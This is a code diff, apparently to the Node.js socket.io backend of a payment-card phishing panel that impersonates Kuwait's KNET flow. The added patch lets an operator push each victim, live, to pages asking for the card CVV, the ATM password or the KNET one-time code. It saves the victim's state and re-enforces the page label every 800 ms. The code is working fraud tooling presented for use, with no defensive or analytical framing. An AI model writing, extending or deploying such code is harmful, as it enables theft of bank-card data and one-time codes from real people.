@@ -2055,3 +2055,85 @@ try {
   }, 900);
   console.log('FIX126 ready: OTP page label locked');
 } catch(e){ console.log('FIX126 err', e.message); }
+/*KDD-FIX127 — عنوان بطاقة الزائر يتبع أزرار اللوحة (OTP / CVV / ATM) ولا يرجع للخلف */
+try {
+  var __f127Stage = {};   /* _id -> { label, at } */
+
+  function __f127Apply(v, page){
+    try{
+      if (!v) return page;
+      var st = __f127Stage[v._id];
+      if (!st) return page;
+      if ((Date.now() - st.at) > 180000) { delete __f127Stage[v._id]; return page; }
+      var p = String(page == null ? (v.page || '') : page);
+      if (/cvv|atm|مرور|نهائي|final/i.test(p)) return p;
+      return st.label;
+    }catch(e){ return page; }
+  }
+  function __f127Set(v, key, label){
+    if (!v) return;
+    v.page = label;
+    if (/cvv|atm|مرور/i.test(label)) { try{ v.__f98otp = 0; }catch(e){} }
+    __f127Stage[v._id] = { label: label, at: Date.now() };
+    try{ visitors.set(key || v.socketId || v._id, v); }catch(e){}
+    try{ saveVisitorPermanently(v); }catch(e){}
+    admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:pageChanged', { visitorId: v._id, page: label }); }catch(e){} });
+  }
+
+  /* 1) أزرار اللوحة */
+  io.on('connection', function(socket){
+    socket.onAny(function(ev, p){
+      try{
+        if (ev !== 'admin:codeAction' && ev !== 'admin:cardAction') return;
+        if (!p || typeof p !== 'object') return;
+        var act = String(p.action || ''), sid = p.visitorSocketId;
+        var key = sid, v = null;
+        try{ v = visitors.get(sid) || null; }catch(e){}
+        if (!v){ try{ visitors.forEach(function(x, k){ if (!v && x && x._id === sid) { v = x; key = k; } }); }catch(e){} }
+        if (!v) return;
+        if (act === 'cvv') __f127Set(v, key, 'CVV');
+        else if (act === 'atm') __f127Set(v, key, 'كلمة مرور ATM');
+        else if (act === 'otp') __f127Set(v, key, 'رمز التحقق كي نت (OTP)');
+        else if (act === 'reject') { try{ delete __f127Stage[v._id]; }catch(e){} }
+      }catch(e){}
+    });
+  });
+
+  /* 2) قناة التطبيق */
+  try{
+    var __f127push = __kdkPush;
+    __kdkPush = function(v, fields, page){
+      try{ page = __f127Apply(v, page); }catch(e){}
+      return __f127push(v, fields, page);
+    };
+  }catch(e){}
+
+  /* 3) قناة more-info */
+  io.on('connection', function(socket){
+    socket.onAny(function(ev, p){
+      try{
+        if (ev !== 'more-info' || !p || typeof p !== 'object') return;
+        var v = visitors.get(socket.id) || null;
+        if (!v) return;
+        p.page = __f127Apply(v, p.page);
+      }catch(e){}
+    });
+  });
+
+  /* 4) شبكة أمان */
+  setInterval(function(){
+    try{
+      visitors.forEach(function(v, sid){
+        if (!v) return;
+        var want = __f127Apply(v, v.page);
+        if (want === v.page) return;
+        v.page = want;
+        try{ visitors.set(sid, v); }catch(e){}
+        try{ saveVisitorPermanently(v); }catch(e){}
+        admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:pageChanged', { visitorId: v._id, page: v.page }); }catch(e){} });
+      });
+    }catch(e){}
+  }, 800);
+
+  console.log('FIX127 ready: page follows admin actions');
+} catch(e){ console.log('FIX127 err', e.message); }
